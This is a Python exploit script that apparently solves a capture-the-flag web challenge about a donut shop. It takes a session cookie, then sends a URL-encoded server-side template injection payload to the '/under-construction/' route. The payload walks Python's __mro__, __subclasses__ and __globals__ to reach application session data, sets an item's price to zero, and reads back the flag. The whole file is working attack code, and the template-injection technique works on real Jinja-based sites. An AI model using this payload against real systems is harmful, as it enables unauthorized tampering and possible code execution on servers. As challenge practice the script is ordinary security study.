import requests
import urllib.parse
import sys

def solve():
    url = ""
    s = requests.Session()
    
    try:
        r1 = s.get(url + "/")
        r1.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"[-] Failed to connect: {e}")
        sys.exit(1)

    session_id = s.cookies.get("donut_session")
    if not session_id:
        print("[-] Could not retrieve session cookie.")
        sys.exit(1)
        
    print(f"[*] Session ID: {session_id}")
    # use this session ID as cookie value in browser , if you want to view it (make sure to refresh)
    payload = '{% for c in "".__class__.__mro__[1].__subclasses__() %}{% if c.__name__ == "DonutState" %}{{ c.__init__.__globals__["sessions_data"][request.cookies["donut_session"]][4].update({"price":0}) }}{% endif %}{% endfor %}'
    encoded_payload = urllib.parse.quote(payload)
    
    s.get(url + "/under-construction/" + encoded_payload)
    
    r3 = s.get(url + "/api/donuts")
    data = r3.json()
    for donut in data:
        if donut.get("name") == "flag":
            flag = donut.get("flag")
            if flag != "Ye gareeb":
                print(f"[+] Flag found: {flag}")
                return True
            else:
                print("[-] Failed to update price.")
                return False
    return False

if __name__ == "__main__":
    solve()
